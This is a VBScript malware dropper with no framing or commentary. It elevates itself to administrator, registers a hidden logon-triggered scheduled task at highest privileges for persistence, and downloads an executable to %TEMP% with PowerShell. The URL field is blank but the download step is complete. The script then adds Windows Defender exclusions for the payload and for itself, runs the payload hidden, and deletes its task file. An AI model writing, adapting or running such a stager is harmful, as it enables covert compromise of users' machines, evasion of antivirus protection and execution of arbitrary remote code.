Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

WScript.Echo "Checking for administrator privileges..."
isAdminCheck = "powershell -Command ""([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"""
Set execCheck = objShell.Exec(isAdminCheck)
isAdmin = execCheck.StdOut.ReadAll()

If InStr(isAdmin, "True") = 0 Then
    WScript.Echo "Administrator privileges not detected. Elevating..."
    currentVBS = WScript.ScriptFullName
    elevateCommand = "powershell -Command ""Start-Process 'wscript.exe' -ArgumentList '""" & currentVBS & """' -Verb RunAs"""
    objShell.Run elevateCommand, 0, False
    'WScript.Quit'
End If

WScript.Echo "Running with administrator privileges."

currentVBS = WScript.ScriptFullName
taskName = "AlwaysRunAsAdmin"
taskXMLPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\always_run_as_admin_task.xml"

If Not fso.FileExists(taskXMLPath) Then
    WScript.Echo "Creating task XML file..."
    Set taskFile = fso.CreateTextFile(taskXMLPath, True)
    taskFile.WriteLine "<?xml version=""1.0"" encoding=""UTF-16""?>"
    taskFile.WriteLine "<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">"
    taskFile.WriteLine "  <Triggers>"
    taskFile.WriteLine "    <LogonTrigger>"
    taskFile.WriteLine "      <Enabled>true</Enabled>"
    taskFile.WriteLine "    </LogonTrigger>"
    taskFile.WriteLine "  </Triggers>"
    taskFile.WriteLine "  <Principals>"
    taskFile.WriteLine "    <Principal id=""Author"">"
    taskFile.WriteLine "      <LogonType>InteractiveToken</LogonType>"
    taskFile.WriteLine "      <RunLevel>HighestAvailable</RunLevel>"
    taskFile.WriteLine "    </Principal>"
    taskFile.WriteLine "  </Principals>"
    taskFile.WriteLine "  <Settings>"
    taskFile.WriteLine "    <AllowStartIfOnBatteries>true</AllowStartIfOnBatteries>"
    taskFile.WriteLine "    <DontStopIfGoingOnBatteries>true</DontStopIfGoingOnBatteries>"
    taskFile.WriteLine "    <StartWhenAvailable>true</StartWhenAvailable>"
    taskFile.WriteLine "    <RunOnlyIfIdle>false</RunOnlyIfIdle>"
    taskFile.WriteLine "    <AllowHardTerminate>true</AllowHardTerminate>"
    taskFile.WriteLine "    <Hidden>true</Hidden>"
    taskFile.WriteLine "    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>"
    taskFile.WriteLine "  </Settings>"
    taskFile.WriteLine "  <Actions Context=""Author"">"
    taskFile.WriteLine "    <Exec>"
    taskFile.WriteLine "      <Command>wscript.exe</Command>"
    taskFile.WriteLine "      <Arguments>" & """" & currentVBS & """" & "</Arguments>"
    taskFile.WriteLine "    </Exec>"
    taskFile.WriteLine "  </Actions>"
    taskFile.WriteLine "</Task>"
    taskFile.Close

    WScript.Echo "Creating task in Task Scheduler..."
    createTaskCommand = "schtasks /create /tn " & taskName & " /xml " & taskXMLPath & " /f"
    objShell.Run createTaskCommand, 0, True

    WScript.Echo "Verifying task creation..."
    verifyCommand = "schtasks /query /tn " & taskName
    Set verifyExec = objShell.Exec(verifyCommand)
    taskOutput = verifyExec.StdOut.ReadAll
    If InStr(taskOutput, taskName) > 0 Then
        WScript.Echo "Task created successfully."
    Else
        WScript.Echo "Error: Task creation failed!"
        'WScript.Quit'
    End If
End If

url = ""
tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
savePath = tempFolder & "\load.exe"
WScript.Echo "File will be downloaded from: " & url
WScript.Echo "File will be saved to: " & savePath

WScript.Echo "Starting file download..."
downloadCommand = "powershell -Command ""Invoke-WebRequest -Uri '" & url & "' -OutFile '" & savePath & "'"""
objShell.Run downloadCommand, 0, True

If fso.FileExists(savePath) Then
    WScript.Echo "File downloaded successfully: " & savePath
Else
    WScript.Echo "Error: File was not downloaded."
    'WScript.Quit'
End If

WScript.Echo "Adding exclusions to Windows Defender..."
addExclusionCommand = "powershell -Command ""Add-MpPreference -ExclusionPath '" & savePath & "'; Add-MpPreference -ExclusionPath '" & currentVBS & "'"""
objShell.Run addExclusionCommand, 0, True

WScript.Echo "Running load.exe directly..."
objShell.Run """" & savePath & """", 0, False 

If fso.FileExists(taskXMLPath) Then
    WScript.Echo "Cleaning up temporary XML file..."
    fso.DeleteFile(taskXMLPath)
End If

WScript.Echo "Script completed."
